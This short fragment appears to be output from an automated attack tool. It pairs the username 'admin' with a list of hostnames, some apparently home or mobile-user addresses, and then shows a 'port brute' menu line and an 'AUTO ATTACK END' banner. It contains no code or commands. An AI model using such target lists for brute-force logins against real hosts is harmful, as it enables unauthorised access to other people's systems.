  admin 11ban.top
  admin 169.j3m4s.zymzs.com
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
[3] port brute
=== AUTO ATTACK END Fri Aug 14 10:06:26 UTC 2026 ===
